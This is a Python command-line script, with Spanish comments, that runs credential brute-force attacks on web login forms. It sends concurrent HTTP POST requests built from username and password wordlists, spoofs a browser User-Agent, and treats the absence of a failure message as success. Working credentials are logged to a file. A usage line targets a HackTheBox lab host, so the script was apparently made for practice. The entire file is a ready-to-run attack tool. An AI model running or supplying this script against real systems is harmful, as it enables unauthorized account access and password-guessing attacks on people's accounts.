#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import re
import sys
from http import HTTPStatus
from pathlib import Path
from typing import Dict, List

import requests
from aiohttp import ClientSession, ClientResponse

from logger import get_logger

REQ_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}


def check_regex_response(response: str, regex: str) -> bool:
    """
    Metodo para comprobar si la respuesta contiene el texto esperado, que sera el que conocemos (el de contraseña
    invalida)
    :param response:
    :param regex:
    :return:
    """
    if not re.search(regex, response, re.IGNORECASE):
        logger.warning("EXITO")
        return True
    return False


async def fetch(session: ClientSession, url: str, my_json: Dict):
    """
    Metodo para realizar una peticion asincrona, cuando termina retorna la respuesta de la peticion
    :param session:
    :param url:
    :param my_json:
    :return:
    """
    response: ClientResponse
    async with session.post(url, data=my_json) as response:
        return await response.read(), response


async def bound_fetch(sem: asyncio.locks.Semaphore, session: ClientSession, args: argparse, username: str,
                      password: str, my_json_str: str, total_size: int, cont):
    """
    Metodo que realiza una peticion asincrona y cuando esta termina comprueba si el resultado ha sido correcto o no
    :param sem:
    :param session:
    :param args:
    :param username:
    :param password:
    :param my_json_str:
    :param total_size:
    :param cont:
    :return:
    """
    # Getter function with semaphore.
    my_json = json.loads(my_json_str)
    async with sem:
        text: bytes
        response: ClientResponse
        text, response = await fetch(session, args.target, my_json)
        if response.status == HTTPStatus.OK:
            valid: bool = check_regex_response(str(text), args.regex)
            if valid:
                logger.warning(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success')
                p: Path = Path('bruteforce_post_async.log')
                with open(str(p), 'a') as f:
                    f.write(f'Trying: user: "{username}", pass: "{password}" -> Success\n')
                sys.exit(0)
            else:
                logger.debug(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail')
        else:
            logger.error(response)
            logger.error(text)


def is_online(url):
    """
    Metodo para comprobar si hay conexion hacia el target
    :param url:
    :return:
    """
    try:
        requests.models.Response = requests.get(url)
    except requests.exceptions.ConnectionError as e:
        logger.critical(f'Error in target: {e}')
        sys.exit(1)


async def run(args: argparse):
    """
    Metodo que realizada una peticion asincrona post por cada elemento de los diccionarios proporcionados
    :param args:
    :return:
    """
    name_username: str
    name_password: str
    my_json: Dict[str, str] = json.loads(args.json)
    keys_json = list(my_json)

    # si el json tiene 1 valor se entiende que es la pass, si tiene 2 hay user y pass
    if len(keys_json) >= 2:
        name_username = keys_json[0]
        name_password = keys_json[1]
    elif len(keys_json) == 1:
        name_username = ''
        name_password = keys_json[0]
    else:
        logger.critical('json is not valid')
        sys.exit(1)

    dict_users: List = list()
    dict_passwords: List = list()

    # creamos un diccionaro de users
    if args.Login is None:
        dict_users.append(args.login)
    else:
        file_username: Path = Path(args.Login)
        if file_username.exists():
            dict_users = file_username.read_text().split('\n')
            dict_users.remove('')  # eliminar lineas en blanco
        else:
            logger.critical(f'File "{args.Login}" not exits')
            sys.exit(1)

    # creamos un diccionaro de passwords
    if args.Password is None:
        dict_passwords.append(args.password)
    else:
        file_password: Path = Path(args.Password)
        if file_password.exists():
            dict_passwords = file_password.read_text().split('\n')
        else:
            logger.critical(f'File "{args.Password}" not exits')
            sys.exit(1)

    is_online(args.target)

    len_user = len(dict_users)
    len_pwd = len(dict_passwords)

    user: str
    pwd: str
    cont: int = 1

    tasks: List = list()
    # create instance of Semaphore
    sem: asyncio.locks.Semaphore = asyncio.Semaphore(1000)

    # Create client session that will ensure we dont open new connection per each request.
    async with ClientSession() as session:
        for user in dict_users:
            # if len(user) == 0:  # si existe alguna liena en blanco la omitimos, ya se hace al crear la lista
            #    continue
            # Actualizamos el username si es necesario ponerlo, ya se hace al crear la lista
            if name_username in my_json.keys():
                my_json[name_username] = user

            for pwd in dict_passwords:
                # Actualizamos la contraseña
                if name_password in my_json.keys():
                    my_json[name_password] = pwd

                # pass Semaphore and session to every GET request
                update_json = json.dumps(my_json)  # si envio el json como dict llega vacio a la funcion (i dont known)
                task = asyncio.ensure_future(
                    bound_fetch(sem, session, args, user, pwd, update_json, (len_user * len_pwd), cont))
                tasks.append(task)
                cont += 1

        responses = asyncio.gather(*tasks)
        await responses


def create_arg_parser() -> argparse:
    """
    Metodo para establecer los argumentos que necesita la clase
    :return:
    """

    example = """python3 %(prog)s  http://docker.hackthebox.eu:31658/ 'Invalid password!' -l admin -P password.txt -j '{"password":""}' -v"""
    my_parser = argparse.ArgumentParser(
        description='%(prog)s is a script to perform brute force attacks by begging HTTP POST requests.',
        usage=f'{example}')

    requiered = my_parser.add_argument_group('requiered arguments')
    requiered.add_argument('target', help='Target to send requests.')
    requiered.add_argument('regex', help='Regular expression we get with incorrect authentication.')

    my_parser.add_argument('-j', '--json', help='Json of the form that is sent with the credentials.',
                           default='{"username":"","password":""}')
    my_parser.add_argument('-l', '--login', help='Name of a user.', default='root')
    my_parser.add_argument('-L', '--Login', help='Path of a file with users.')
    my_parser.add_argument('-p', '--password', help='A passwords.', default='admin')
    my_parser.add_argument('-P', '--Password', help='Path of a file with passwords.')
    # my_parser.add_argument('-a', '--advanced', action='store_true', help='Scan advanced (boolean).', default=False)
    my_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose flag (boolean).', default=False)

    if len(sys.argv) == 1:
        my_parser.print_help()
        sys.exit(1)
    return my_parser.parse_args()


def main():
    arg: argparse = create_arg_parser()

    global logger
    logger = get_logger(arg.verbose, 'bruteforce')

    if arg.verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run(arg))
    loop.run_until_complete(future)


if __name__ == '__main__':
    main()
